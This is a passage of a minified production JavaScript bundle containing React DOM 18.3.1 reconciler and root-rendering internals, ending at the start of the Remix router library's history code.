                        u = Error(G(426))
                    }
                } else if (pt && s.mode & 1) {
                    var x = rp(i);
                    if (x !== null) {
                        !(x.flags & 65536) && (x.flags |= 256),
                        ap(x, i, s, o, t),
                        pf(Ga(u, s));
                        break e
                    }
                }
                o = u = Ga(u, s),
                Tt !== 4 && (Tt = 2),
                Uo === null ? Uo = [o] : Uo.push(o),
                o = i;
                do {
                    switch (o.tag) {
                    case 3:
                        o.flags |= 65536,
                        t &= -t,
                        o.lanes |= t;
                        var g = j0(o, u, t);
                        Xd(o, g);
                        break e;
                    case 1:
                        s = u;
                        var p = o.type
                          , m = o.stateNode;
                        if (!(o.flags & 128) && (typeof p.getDerivedStateFromError == "function" || m !== null && typeof m.componentDidCatch == "function" && (Cr === null || !Cr.has(m)))) {
                            o.flags |= 65536,
                            t &= -t,
                            o.lanes |= t;
                            var C = E0(o, s, t);
                            Xd(o, C);
                            break e
                        }
                    }
                    o = o.return
                } while (o !== null)
            }
            K0(n)
        } catch (k) {
            t = k,
            jt === n && n !== null && (jt = n = n.return);
            continue
        }
        break
    } while (!0)
}
function V0() {
    var e = Ds.current;
    return Ds.current = Ms,
    e === null ? Ms : e
}
function Af() {
    (Tt === 0 || Tt === 3 || Tt === 2) && (Tt = 4),
    At === null || !(oa & 268435455) && !(dl & 268435455) || hr(At, Mt)
}
function Us(e, t) {
    var n = Ge;
    Ge |= 2;
    var r = V0();
    (At !== e || Mt !== t) && ($n = null,
    qr(e, t));
    do
        try {
            Xv();
            break
        } catch (a) {
            H0(e, a)
        }
    while (!0);
    if (mf(),
    Ge = n,
    Ds.current = r,
    jt !== null)
        throw Error(G(261));
    return At = null,
    Mt = 0,
    Tt
}
function Xv() {
    for (; jt !== null; )
        W0(jt)
}
function qv() {
    for (; jt !== null && !Sy(); )
        W0(jt)
}
function W0(e) {
    var t = Y0(e.alternate, e, rn);
    e.memoizedProps = e.pendingProps,
    t === null ? K0(e) : jt = t,
    _f.current = null
}
function K0(e) {
    var t = e;
    do {
        var n = t.alternate;
        if (e = t.return,
        t.flags & 32768) {
            if (n = Vv(n, t),
            n !== null) {
                n.flags &= 32767,
                jt = n;
                return
            }
            if (e !== null)
                e.flags |= 32768,
                e.subtreeFlags = 0,
                e.deletions = null;
            else {
                Tt = 6,
                jt = null;
                return
            }
        } else if (n = Hv(n, t, rn),
        n !== null) {
            jt = n;
            return
        }
        if (t = t.sibling,
        t !== null) {
            jt = t;
            return
        }
        jt = t = e
    } while (t !== null);
    Tt === 0 && (Tt = 5)
}
function Br(e, t, n) {
    var r = Je
      , a = xn.transition;
    try {
        xn.transition = null,
        Je = 1,
        Jv(e, t, n, r)
    } finally {
        xn.transition = a,
        Je = r
    }
    return null
}
function Jv(e, t, n, r) {
    do
        Ua();
    while (gr !== null);
    if (Ge & 6)
        throw Error(G(327));
    n = e.finishedWork;
    var a = e.finishedLanes;
    if (n === null)
        return null;
    if (e.finishedWork = null,
    e.finishedLanes = 0,
    n === e.current)
        throw Error(G(177));
    e.callbackNode = null,
    e.callbackPriority = 0;
    var o = n.lanes | n.childLanes;
    if (Ry(e, o),
    e === At && (jt = At = null,
    Mt = 0),
    !(n.subtreeFlags & 2064) && !(n.flags & 2064) || Qi || (Qi = !0,
    Q0(bs, function() {
        return Ua(),
        null
    })),
    o = (n.flags & 15990) !== 0,
    n.subtreeFlags & 15990 || o) {
        o = xn.transition,
        xn.transition = null;
        var i = Je;
        Je = 1;
        var s = Ge;
        Ge |= 4,
        _f.current = null,
        Kv(e, n),
        U0(n, e),
        vv(Vu),
        Ns = !!Hu,
        Vu = Hu = null,
        e.current = n,
        Gv(n),
        Ny(),
        Ge = s,
        Je = i,
        xn.transition = o
    } else
        e.current = n;
    if (Qi && (Qi = !1,
    gr = e,
    Fs = a),
    o = e.pendingLanes,
    o === 0 && (Cr = null),
    jy(n.stateNode),
    Jt(e, Ct()),
    t !== null)
        for (r = e.onRecoverableError,
        n = 0; n < t.length; n++)
            a = t[n],
            r(a.value, {
                componentStack: a.stack,
                digest: a.digest
            });
    if (zs)
        throw zs = !1,
        e = cc,
        cc = null,
        e;
    return Fs & 1 && e.tag !== 0 && Ua(),
    o = e.pendingLanes,
    o & 1 ? e === fc ? Bo++ : (Bo = 0,
    fc = e) : Bo = 0,
    Lr(),
    null
}
function Ua() {
    if (gr !== null) {
        var e = jm(Fs)
          , t = xn.transition
          , n = Je;
        try {
            if (xn.transition = null,
            Je = 16 > e ? 16 : e,
            gr === null)
                var r = !1;
            else {
                if (e = gr,
                gr = null,
                Fs = 0,
                Ge & 6)
                    throw Error(G(331));
                var a = Ge;
                for (Ge |= 4,
                se = e.current; se !== null; ) {
                    var o = se
                      , i = o.child;
                    if (se.flags & 16) {
                        var s = o.deletions;
                        if (s !== null) {
                            for (var u = 0; u < s.length; u++) {
                                var c = s[u];
                                for (se = c; se !== null; ) {
                                    var f = se;
                                    switch (f.tag) {
                                    case 0:
                                    case 11:
                                    case 15:
                                        Fo(8, f, o)
                                    }
                                    var d = f.child;
                                    if (d !== null)
                                        d.return = f,
                                        se = d;
                                    else
                                        for (; se !== null; ) {
                                            f = se;
                                            var h = f.sibling
                                              , N = f.return;
                                            if (D0(f),
                                            f === c) {
                                                se = null;
                                                break
                                            }
                                            if (h !== null) {
                                                h.return = N,
                                                se = h;
                                                break
                                            }
                                            se = N
                                        }
                                }
                            }
                            var y = o.alternate;
                            if (y !== null) {
                                var S = y.child;
                                if (S !== null) {
                                    y.child = null;
                                    do {
                                        var x = S.sibling;
                                        S.sibling = null,
                                        S = x
                                    } while (S !== null)
                                }
                            }
                            se = o
                        }
                    }
                    if (o.subtreeFlags & 2064 && i !== null)
                        i.return = o,
                        se = i;
                    else
                        e: for (; se !== null; ) {
                            if (o = se,
                            o.flags & 2048)
                                switch (o.tag) {
                                case 0:
                                case 11:
                                case 15:
                                    Fo(9, o, o.return)
                                }
                            var g = o.sibling;
                            if (g !== null) {
                                g.return = o.return,
                                se = g;
                                break e
                            }
                            se = o.return
                        }
                }
                var p = e.current;
                for (se = p; se !== null; ) {
                    i = se;
                    var m = i.child;
                    if (i.subtreeFlags & 2064 && m !== null)
                        m.return = i,
                        se = m;
                    else
                        e: for (i = p; se !== null; ) {
                            if (s = se,
                            s.flags & 2048)
                                try {
                                    switch (s.tag) {
                                    case 0:
                                    case 11:
                                    case 15:
                                        fl(9, s)
                                    }
                                } catch (k) {
                                    bt(s, s.return, k)
                                }
                            if (s === i) {
                                se = null;
                                break e
                            }
                            var C = s.sibling;
                            if (C !== null) {
                                C.return = s.return,
                                se = C;
                                break e
                            }
                            se = s.return
                        }
                }
                if (Ge = a,
                Lr(),
                Dn && typeof Dn.onPostCommitFiberRoot == "function")
                    try {
                        Dn.onPostCommitFiberRoot(rl, e)
                    } catch {}
                r = !0
            }
            return r
        } finally {
            Je = n,
            xn.transition = t
        }
    }
    return !1
}
function yp(e, t, n) {
    t = Ga(n, t),
    t = j0(e, t, 1),
    e = Nr(e, t, 1),
    t = Ht(),
    e !== null && (gi(e, 1, t),
    Jt(e, t))
}
function bt(e, t, n) {
    if (e.tag === 3)
        yp(e, e, n);
    else
        for (; t !== null; ) {
            if (t.tag === 3) {
                yp(t, e, n);
                break
            } else if (t.tag === 1) {
                var r = t.stateNode;
                if (typeof t.type.getDerivedStateFromError == "function" || typeof r.componentDidCatch == "function" && (Cr === null || !Cr.has(r))) {
                    e = Ga(n, e),
                    e = E0(t, e, 1),
                    t = Nr(t, e, 1),
                    e = Ht(),
                    t !== null && (gi(t, 1, e),
                    Jt(t, e));
                    break
                }
            }
            t = t.return
        }
}
function Zv(e, t, n) {
    var r = e.pingCache;
    r !== null && r.delete(t),
    t = Ht(),
    e.pingedLanes |= e.suspendedLanes & n,
    At === e && (Mt & n) === n && (Tt === 4 || Tt === 3 && (Mt & 130023424) === Mt && 500 > Ct() - Pf ? qr(e, 0) : Tf |= n),
    Jt(e, t)
}
function G0(e, t) {
    t === 0 && (e.mode & 1 ? (t = Fi,
    Fi <<= 1,
    !(Fi & 130023424) && (Fi = 4194304)) : t = 1);
    var n = Ht();
    e = Xn(e, t),
    e !== null && (gi(e, t, n),
    Jt(e, n))
}
function e2(e) {
    var t = e.memoizedState
      , n = 0;
    t !== null && (n = t.retryLane),
    G0(e, n)
}
function t2(e, t) {
    var n = 0;
    switch (e.tag) {
    case 13:
        var r = e.stateNode
          , a = e.memoizedState;
        a !== null && (n = a.retryLane);
        break;
    case 19:
        r = e.stateNode;
        break;
    default:
        throw Error(G(314))
    }
    r !== null && r.delete(t),
    G0(e, n)
}
var Y0;
Y0 = function(e, t, n) {
    if (e !== null)
        if (e.memoizedProps !== t.pendingProps || Xt.current)
            Qt = !0;
        else {
            if (!(e.lanes & n) && !(t.flags & 128))
                return Qt = !1,
                $v(e, t, n);
            Qt = !!(e.flags & 131072)
        }
    else
        Qt = !1,
        pt && t.flags & 1048576 && Jm(t, Ps, t.index);
    switch (t.lanes = 0,
    t.tag) {
    case 2:
        var r = t.type;
        ls(e, t),
        e = t.pendingProps;
        var a = Ha(t, Bt.current);
        Fa(t, n),
        a = Nf(null, t, r, e, a, n);
        var o = Cf();
        return t.flags |= 1,
        typeof a == "object" && a !== null && typeof a.render == "function" && a.$$typeof === void 0 ? (t.tag = 1,
        t.memoizedState = null,
        t.updateQueue = null,
        qt(r) ? (o = !0,
        _s(t)) : o = !1,
        t.memoizedState = a.state !== null && a.state !== void 0 ? a.state : null,
        vf(t),
        a.updater = cl,
        t.stateNode = a,
        a._reactInternals = t,
        Zu(t, r, e, n),
        t = nc(null, t, r, !0, o, n)) : (t.tag = 0,
        pt && o && ff(t),
        $t(null, t, a, n),
        t = t.child),
        t;
    case 16:
        r = t.elementType;
        e: {
            switch (ls(e, t),
            e = t.pendingProps,
            a = r._init,
            r = a(r._payload),
            t.type = r,
            a = t.tag = r2(r),
            e = Nn(r, e),
            a) {
            case 0:
                t = tc(null, t, r, e, n);
                break e;
            case 1:
                t = sp(null, t, r, e, n);
                break e;
            case 11:
                t = op(null, t, r, e, n);
                break e;
            case 14:
                t = ip(null, t, r, Nn(r.type, e), n);
                break e
            }
            throw Error(G(306, r, ""))
        }
        return t;
    case 0:
        return r = t.type,
        a = t.pendingProps,
        a = t.elementType === r ? a : Nn(r, a),
        tc(e, t, r, a, n);
    case 1:
        return r = t.type,
        a = t.pendingProps,
        a = t.elementType === r ? a : Nn(r, a),
        sp(e, t, r, a, n);
    case 3:
        e: {
            if (O0(t),
            e === null)
                throw Error(G(387));
            r = t.pendingProps,
            o = t.memoizedState,
            a = o.element,
            a0(e, t),
            As(t, r, null, n);
            var i = t.memoizedState;
            if (r = i.element,
            o.isDehydrated)
                if (o = {
                    element: r,
                    isDehydrated: !1,
                    cache: i.cache,
                    pendingSuspenseBoundaries: i.pendingSuspenseBoundaries,
                    transitions: i.transitions
                },
                t.updateQueue.baseState = o,
                t.memoizedState = o,
                t.flags & 256) {
                    a = Ga(Error(G(423)), t),
                    t = lp(e, t, r, n, a);
                    break e
                } else if (r !== a) {
                    a = Ga(Error(G(424)), t),
                    t = lp(e, t, r, n, a);
                    break e
                } else
                    for (on = Sr(t.stateNode.containerInfo.firstChild),
                    sn = t,
                    pt = !0,
                    jn = null,
                    n = n0(t, null, r, n),
                    t.child = n; n; )
                        n.flags = n.flags & -3 | 4096,
                        n = n.sibling;
            else {
                if (Va(),
                r === a) {
                    t = qn(e, t, n);
                    break e
                }
                $t(e, t, r, n)
            }
            t = t.child
        }
        return t;
    case 5:
        return o0(t),
        e === null && Xu(t),
        r = t.type,
        a = t.pendingProps,
        o = e !== null ? e.memoizedProps : null,
        i = a.children,
        Wu(r, a) ? i = null : o !== null && Wu(r, o) && (t.flags |= 32),
        P0(e, t),
        $t(e, t, i, n),
        t.child;
    case 6:
        return e === null && Xu(t),
        null;
    case 13:
        return R0(e, t, n);
    case 4:
        return xf(t, t.stateNode.containerInfo),
        r = t.pendingProps,
        e === null ? t.child = Wa(t, null, r, n) : $t(e, t, r, n),
        t.child;
    case 11:
        return r = t.type,
        a = t.pendingProps,
        a = t.elementType === r ? a : Nn(r, a),
        op(e, t, r, a, n);
    case 7:
        return $t(e, t, t.pendingProps, n),
        t.child;
    case 8:
        return $t(e, t, t.pendingProps.children, n),
        t.child;
    case 12:
        return $t(e, t, t.pendingProps.children, n),
        t.child;
    case 10:
        e: {
            if (r = t.type._context,
            a = t.pendingProps,
            o = t.memoizedProps,
            i = a.value,
            rt(Os, r._currentValue),
            r._currentValue = i,
            o !== null)
                if (Tn(o.value, i)) {
                    if (o.children === a.children && !Xt.current) {
                        t = qn(e, t, n);
                        break e
                    }
                } else
                    for (o = t.child,
                    o !== null && (o.return = t); o !== null; ) {
                        var s = o.dependencies;
                        if (s !== null) {
                            i = o.child;
                            for (var u = s.firstContext; u !== null; ) {
                                if (u.context === r) {
                                    if (o.tag === 1) {
                                        u = Kn(-1, n & -n),
                                        u.tag = 2;
                                        var c = o.updateQueue;
                                        if (c !== null) {
                                            c = c.shared;
                                            var f = c.pending;
                                            f === null ? u.next = u : (u.next = f.next,
                                            f.next = u),
                                            c.pending = u
                                        }
                                    }
                                    o.lanes |= n,
                                    u = o.alternate,
                                    u !== null && (u.lanes |= n),
                                    qu(o.return, n, t),
                                    s.lanes |= n;
                                    break
                                }
                                u = u.next
                            }
                        } else if (o.tag === 10)
                            i = o.type === t.type ? null : o.child;
                        else if (o.tag === 18) {
                            if (i = o.return,
                            i === null)
                                throw Error(G(341));
                            i.lanes |= n,
                            s = i.alternate,
                            s !== null && (s.lanes |= n),
                            qu(i, n, t),
                            i = o.sibling
                        } else
                            i = o.child;
                        if (i !== null)
                            i.return = o;
                        else
                            for (i = o; i !== null; ) {
                                if (i === t) {
                                    i = null;
                                    break
                                }
                                if (o = i.sibling,
                                o !== null) {
                                    o.return = i.return,
                                    i = o;
                                    break
                                }
                                i = i.return
                            }
                        o = i
                    }
            $t(e, t, a.children, n),
            t = t.child
        }
        return t;
    case 9:
        return a = t.type,
        r = t.pendingProps.children,
        Fa(t, n),
        a = wn(a),
        r = r(a),
        t.flags |= 1,
        $t(e, t, r, n),
        t.child;
    case 14:
        return r = t.type,
        a = Nn(r, t.pendingProps),
        a = Nn(r.type, a),
        ip(e, t, r, a, n);
    case 15:
        return _0(e, t, t.type, t.pendingProps, n);
    case 17:
        return r = t.type,
        a = t.pendingProps,
        a = t.elementType === r ? a : Nn(r, a),
        ls(e, t),
        t.tag = 1,
        qt(r) ? (e = !0,
        _s(t)) : e = !1,
        Fa(t, n),
        k0(t, r, a),
        Zu(t, r, a, n),
        nc(null, t, r, !0, e, n);
    case 19:
        return A0(e, t, n);
    case 22:
        return T0(e, t, n)
    }
    throw Error(G(156, t.tag))
}
;
function Q0(e, t) {
    return Sm(e, t)
}
function n2(e, t, n, r) {
    this.tag = e,
    this.key = n,
    this.sibling = this.child = this.return = this.stateNode = this.type = this.elementType = null,
    this.index = 0,
    this.ref = null,
    this.pendingProps = t,
    this.dependencies = this.memoizedState = this.updateQueue = this.memoizedProps = null,
    this.mode = r,
    this.subtreeFlags = this.flags = 0,
    this.deletions = null,
    this.childLanes = this.lanes = 0,
    this.alternate = null
}
function vn(e, t, n, r) {
    return new n2(e,t,n,r)
}
function Lf(e) {
    return e = e.prototype,
    !(!e || !e.isReactComponent)
}
function r2(e) {
    if (typeof e == "function")
        return Lf(e) ? 1 : 0;
    if (e != null) {
        if (e = e.$$typeof,
        e === Jc)
            return 11;
        if (e === Zc)
            return 14
    }
    return 2
}
function jr(e, t) {
    var n = e.alternate;
    return n === null ? (n = vn(e.tag, t, e.key, e.mode),
    n.elementType = e.elementType,
    n.type = e.type,
    n.stateNode = e.stateNode,
    n.alternate = e,
    e.alternate = n) : (n.pendingProps = t,
    n.type = e.type,
    n.flags = 0,
    n.subtreeFlags = 0,
    n.deletions = null),
    n.flags = e.flags & 14680064,
    n.childLanes = e.childLanes,
    n.lanes = e.lanes,
    n.child = e.child,
    n.memoizedProps = e.memoizedProps,
    n.memoizedState = e.memoizedState,
    n.updateQueue = e.updateQueue,
    t = e.dependencies,
    n.dependencies = t === null ? null : {
        lanes: t.lanes,
        firstContext: t.firstContext
    },
    n.sibling = e.sibling,
    n.index = e.index,
    n.ref = e.ref,
    n
}
function fs(e, t, n, r, a, o) {
    var i = 2;
    if (r = e,
    typeof e == "function")
        Lf(e) && (i = 1);
    else if (typeof e == "string")
        i = 5;
    else
        e: switch (e) {
        case Sa:
            return Jr(n.children, a, o, t);
        case qc:
            i = 8,
            a |= 8;
            break;
        case Nu:
            return e = vn(12, n, t, a | 2),
            e.elementType = Nu,
            e.lanes = o,
            e;
        case Cu:
            return e = vn(13, n, t, a),
            e.elementType = Cu,
            e.lanes = o,
            e;
        case ku:
            return e = vn(19, n, t, a),
            e.elementType = ku,
            e.lanes = o,
            e;
        case om:
            return pl(n, a, o, t);
        default:
            if (typeof e == "object" && e !== null)
                switch (e.$$typeof) {
                case rm:
                    i = 10;
                    break e;
                case am:
                    i = 9;
                    break e;
                case Jc:
                    i = 11;
                    break e;
                case Zc:
                    i = 14;
                    break e;
                case fr:
                    i = 16,
                    r = null;
                    break e
                }
            throw Error(G(130, e == null ? e : typeof e, ""))
        }
    return t = vn(i, n, t, a),
    t.elementType = e,
    t.type = r,
    t.lanes = o,
    t
}
function Jr(e, t, n, r) {
    return e = vn(7, e, r, t),
    e.lanes = n,
    e
}
function pl(e, t, n, r) {
    return e = vn(22, e, r, t),
    e.elementType = om,
    e.lanes = n,
    e.stateNode = {
        isHidden: !1
    },
    e
}
function au(e, t, n) {
    return e = vn(6, e, null, t),
    e.lanes = n,
    e
}
function ou(e, t, n) {
    return t = vn(4, e.children !== null ? e.children : [], e.key, t),
    t.lanes = n,
    t.stateNode = {
        containerInfo: e.containerInfo,
        pendingChildren: null,
        implementation: e.implementation
    },
    t
}
function a2(e, t, n, r, a) {
    this.tag = t,
    this.containerInfo = e,
    this.finishedWork = this.pingCache = this.current = this.pendingChildren = null,
    this.timeoutHandle = -1,
    this.callbackNode = this.pendingContext = this.context = null,
    this.callbackPriority = 0,
    this.eventTimes = Fl(0),
    this.expirationTimes = Fl(-1),
    this.entangledLanes = this.finishedLanes = this.mutableReadLanes = this.expiredLanes = this.pingedLanes = this.suspendedLanes = this.pendingLanes = 0,
    this.entanglements = Fl(0),
    this.identifierPrefix = r,
    this.onRecoverableError = a,
    this.mutableSourceEagerHydrationData = null
}
function If(e, t, n, r, a, o, i, s, u) {
    return e = new a2(e,t,n,s,u),
    t === 1 ? (t = 1,
    o === !0 && (t |= 8)) : t = 0,
    o = vn(3, null, null, t),
    e.current = o,
    o.stateNode = e,
    o.memoizedState = {
        element: r,
        isDehydrated: n,
        cache: null,
        transitions: null,
        pendingSuspenseBoundaries: null
    },
    vf(o),
    e
}
function o2(e, t, n) {
    var r = 3 < arguments.length && arguments[3] !== void 0 ? arguments[3] : null;
    return {
        $$typeof: ba,
        key: r == null ? null : "" + r,
        children: e,
        containerInfo: t,
        implementation: n
    }
}
function X0(e) {
    if (!e)
        return _r;
    e = e._reactInternals;
    e: {
        if (pa(e) !== e || e.tag !== 1)
            throw Error(G(170));
        var t = e;
        do {
            switch (t.tag) {
            case 3:
                t = t.stateNode.context;
                break e;
            case 1:
                if (qt(t.type)) {
                    t = t.stateNode.__reactInternalMemoizedMergedChildContext;
                    break e
                }
            }
            t = t.return
        } while (t !== null);
        throw Error(G(171))
    }
    if (e.tag === 1) {
        var n = e.type;
        if (qt(n))
            return Xm(e, n, t)
    }
    return t
}
function q0(e, t, n, r, a, o, i, s, u) {
    return e = If(n, r, !0, e, a, o, i, s, u),
    e.context = X0(null),
    n = e.current,
    r = Ht(),
    a = kr(n),
    o = Kn(r, a),
    o.callback = t ?? null,
    Nr(n, o, a),
    e.current.lanes = a,
    gi(e, a, r),
    Jt(e, r),
    e
}
function hl(e, t, n, r) {
    var a = t.current
      , o = Ht()
      , i = kr(a);
    return n = X0(n),
    t.context === null ? t.context = n : t.pendingContext = n,
    t = Kn(o, i),
    t.payload = {
        element: e
    },
    r = r === void 0 ? null : r,
    r !== null && (t.callback = r),
    e = Nr(a, t, i),
    e !== null && (_n(e, a, i, o),
    os(e, a, i)),
    i
}
function Bs(e) {
    if (e = e.current,
    !e.child)
        return null;
    switch (e.child.tag) {
    case 5:
        return e.child.stateNode;
    default:
        return e.child.stateNode
    }
}
function vp(e, t) {
    if (e = e.memoizedState,
    e !== null && e.dehydrated !== null) {
        var n = e.retryLane;
        e.retryLane = n !== 0 && n < t ? n : t
    }
}
function Mf(e, t) {
    vp(e, t),
    (e = e.alternate) && vp(e, t)
}
function i2() {
    return null
}
var J0 = typeof reportError == "function" ? reportError : function(e) {
    console.error(e)
}
;
function Df(e) {
    this._internalRoot = e
}
ml.prototype.render = Df.prototype.render = function(e) {
    var t = this._internalRoot;
    if (t === null)
        throw Error(G(409));
    hl(e, t, null, null)
}
;
ml.prototype.unmount = Df.prototype.unmount = function() {
    var e = this._internalRoot;
    if (e !== null) {
        this._internalRoot = null;
        var t = e.containerInfo;
        ia(function() {
            hl(null, e, null, null)
        }),
        t[Qn] = null
    }
}
;
function ml(e) {
    this._internalRoot = e
}
ml.prototype.unstable_scheduleHydration = function(e) {
    if (e) {
        var t = Tm();
        e = {
            blockedOn: null,
            target: e,
            priority: t
        };
        for (var n = 0; n < pr.length && t !== 0 && t < pr[n].priority; n++)
            ;
        pr.splice(n, 0, e),
        n === 0 && Om(e)
    }
}
;
function zf(e) {
    return !(!e || e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11)
}
function gl(e) {
    return !(!e || e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11 && (e.nodeType !== 8 || e.nodeValue !== " react-mount-point-unstable "))
}
function xp() {}
function s2(e, t, n, r, a) {
    if (a) {
        if (typeof r == "function") {
            var o = r;
            r = function() {
                var c = Bs(i);
                o.call(c)
            }
        }
        var i = q0(t, r, e, 0, null, !1, !1, "", xp);
        return e._reactRootContainer = i,
        e[Qn] = i.current,
        Zo(e.nodeType === 8 ? e.parentNode : e),
        ia(),
        i
    }
    for (; a = e.lastChild; )
        e.removeChild(a);
    if (typeof r == "function") {
        var s = r;
        r = function() {
            var c = Bs(u);
            s.call(c)
        }
    }
    var u = If(e, 0, !1, null, null, !1, !1, "", xp);
    return e._reactRootContainer = u,
    e[Qn] = u.current,
    Zo(e.nodeType === 8 ? e.parentNode : e),
    ia(function() {
        hl(t, u, n, r)
    }),
    u
}
function yl(e, t, n, r, a) {
    var o = n._reactRootContainer;
    if (o) {
        var i = o;
        if (typeof a == "function") {
            var s = a;
            a = function() {
                var u = Bs(i);
                s.call(u)
            }
        }
        hl(t, i, e, a)
    } else
        i = s2(n, t, e, a, r);
    return Bs(i)
}
Em = function(e) {
    switch (e.tag) {
    case 3:
        var t = e.stateNode;
        if (t.current.memoizedState.isDehydrated) {
            var n = _o(t.pendingLanes);
            n !== 0 && (nf(t, n | 1),
            Jt(t, Ct()),
            !(Ge & 6) && (Ya = Ct() + 500,
            Lr()))
        }
        break;
    case 13:
        ia(function() {
            var r = Xn(e, 1);
            if (r !== null) {
                var a = Ht();
                _n(r, e, 1, a)
            }
        }),
        Mf(e, 1)
    }
}
;
rf = function(e) {
    if (e.tag === 13) {
        var t = Xn(e, 134217728);
        if (t !== null) {
            var n = Ht();
            _n(t, e, 134217728, n)
        }
        Mf(e, 134217728)
    }
}
;
_m = function(e) {
    if (e.tag === 13) {
        var t = kr(e)
          , n = Xn(e, t);
        if (n !== null) {
            var r = Ht();
            _n(n, e, t, r)
        }
        Mf(e, t)
    }
}
;
Tm = function() {
    return Je
}
;
Pm = function(e, t) {
    var n = Je;
    try {
        return Je = e,
        t()
    } finally {
        Je = n
    }
}
;
Iu = function(e, t, n) {
    switch (t) {
    case "input":
        if (_u(e, n),
        t = n.name,
        n.type === "radio" && t != null) {
            for (n = e; n.parentNode; )
                n = n.parentNode;
            for (n = n.querySelectorAll("input[name=" + JSON.stringify("" + t) + '][type="radio"]'),
            t = 0; t < n.length; t++) {
                var r = n[t];
                if (r !== e && r.form === e.form) {
                    var a = sl(r);
                    if (!a)
                        throw Error(G(90));
                    sm(r),
                    _u(r, a)
                }
            }
        }
        break;
    case "textarea":
        um(e, n);
        break;
    case "select":
        t = n.value,
        t != null && Ia(e, !!n.multiple, t, !1)
    }
}
;
gm = Of;
ym = ia;
var l2 = {
    usingClientEntryPoint: !1,
    Events: [vi, ja, sl, hm, mm, Of]
}
  , xo = {
    findFiberByHostInstance: Wr,
    bundleType: 0,
    version: "18.3.1",
    rendererPackageName: "react-dom"
}
  , u2 = {
    bundleType: xo.bundleType,
    version: xo.version,
    rendererPackageName: xo.rendererPackageName,
    rendererConfig: xo.rendererConfig,
    overrideHookState: null,
    overrideHookStateDeletePath: null,
    overrideHookStateRenamePath: null,
    overrideProps: null,
    overridePropsDeletePath: null,
    overridePropsRenamePath: null,
    setErrorHandler: null,
    setSuspenseHandler: null,
    scheduleUpdate: null,
    currentDispatcherRef: er.ReactCurrentDispatcher,
    findHostInstanceByFiber: function(e) {
        return e = wm(e),
        e === null ? null : e.stateNode
    },
    findFiberByHostInstance: xo.findFiberByHostInstance || i2,
    findHostInstancesForRefresh: null,
    scheduleRefresh: null,
    scheduleRoot: null,
    setRefreshHandler: null,
    getCurrentFiber: null,
    reconcilerVersion: "18.3.1-next-f1338f8080-20240426"
};
if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ < "u") {
    var Xi = __REACT_DEVTOOLS_GLOBAL_HOOK__;
    if (!Xi.isDisabled && Xi.supportsFiber)
        try {
            rl = Xi.inject(u2),
            Dn = Xi
        } catch {}
}
dn.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = l2;
dn.createPortal = function(e, t) {
    var n = 2 < arguments.length && arguments[2] !== void 0 ? arguments[2] : null;
    if (!zf(t))
        throw Error(G(200));
    return o2(e, t, null, n)
}
;
dn.createRoot = function(e, t) {
    if (!zf(e))
        throw Error(G(299));
    var n = !1
      , r = ""
      , a = J0;
    return t != null && (t.unstable_strictMode === !0 && (n = !0),
    t.identifierPrefix !== void 0 && (r = t.identifierPrefix),
    t.onRecoverableError !== void 0 && (a = t.onRecoverableError)),
    t = If(e, 1, !1, null, null, n, !1, r, a),
    e[Qn] = t.current,
    Zo(e.nodeType === 8 ? e.parentNode : e),
    new Df(t)
}
;
dn.findDOMNode = function(e) {
    if (e == null)
        return null;
    if (e.nodeType === 1)
        return e;
    var t = e._reactInternals;
    if (t === void 0)
        throw typeof e.render == "function" ? Error(G(188)) : (e = Object.keys(e).join(","),
        Error(G(268, e)));
    return e = wm(t),
    e = e === null ? null : e.stateNode,
    e
}
;
dn.flushSync = function(e) {
    return ia(e)
}
;
dn.hydrate = function(e, t, n) {
    if (!gl(t))
        throw Error(G(200));
    return yl(null, e, t, !0, n)
}
;
dn.hydrateRoot = function(e, t, n) {
    if (!zf(e))
        throw Error(G(405));
    var r = n != null && n.hydratedSources || null
      , a = !1
      , o = ""
      , i = J0;
    if (n != null && (n.unstable_strictMode === !0 && (a = !0),
    n.identifierPrefix !== void 0 && (o = n.identifierPrefix),
    n.onRecoverableError !== void 0 && (i = n.onRecoverableError)),
    t = q0(t, null, e, 1, n ?? null, a, !1, o, i),
    e[Qn] = t.current,
    Zo(e),
    r)
        for (e = 0; e < r.length; e++)
            n = r[e],
            a = n._getVersion,
            a = a(n._source),
            t.mutableSourceEagerHydrationData == null ? t.mutableSourceEagerHydrationData = [n, a] : t.mutableSourceEagerHydrationData.push(n, a);
    return new ml(t)
}
;
dn.render = function(e, t, n) {
    if (!gl(t))
        throw Error(G(200));
    return yl(null, e, t, !1, n)
}
;
dn.unmountComponentAtNode = function(e) {
    if (!gl(e))
        throw Error(G(40));
    return e._reactRootContainer ? (ia(function() {
        yl(null, null, e, !1, function() {
            e._reactRootContainer = null,
            e[Qn] = null
        })
    }),
    !0) : !1
}
;
dn.unstable_batchedUpdates = Of;
dn.unstable_renderSubtreeIntoContainer = function(e, t, n, r) {
    if (!gl(n))
        throw Error(G(200));
    if (e == null || e._reactInternals === void 0)
        throw Error(G(38));
    return yl(e, t, n, !1, r)
}
;
dn.version = "18.3.1-next-f1338f8080-20240426";
function Z0() {
    if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function"))
        try {
            __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(Z0)
        } catch (e) {
            console.error(e)
        }
}
Z0(),
Zh.exports = dn;
var Ff = Zh.exports;
const c2 = hi(Ff)
  , f2 = Bh({
    __proto__: null,
    default: c2
}, [Ff]);
var eg, wp = Ff;
eg = wp.createRoot,
wp.hydrateRoot;
/**
 * @remix-run/router v1.21.0
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */
function dt() {
    return dt = Object.assign ? Object.assign.bind() : function(e) {
        for (var t = 1; t < arguments.length; t++) {
            var n = arguments[t];
            for (var r in n)
                Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r])
        }
        return e
    }
    ,
    dt.apply(this, arguments)
}
var kt;
(function(e) {
    e.Pop = "POP",
    e.Push = "PUSH",
    e.Replace = "REPLACE"
}
)(kt || (kt = {}));
const bp = "popstate";
function d2(e) {
    e === void 0 && (e = {});
    function t(r, a) {
        let {pathname: o, search: i, hash: s} = r.location;
        return li("", {
            pathname: o,
            search: i,
            hash: s
        }, a.state && a.state.usr || null, a.state && a.state.key || "default")
    }
    function n(r, a) {
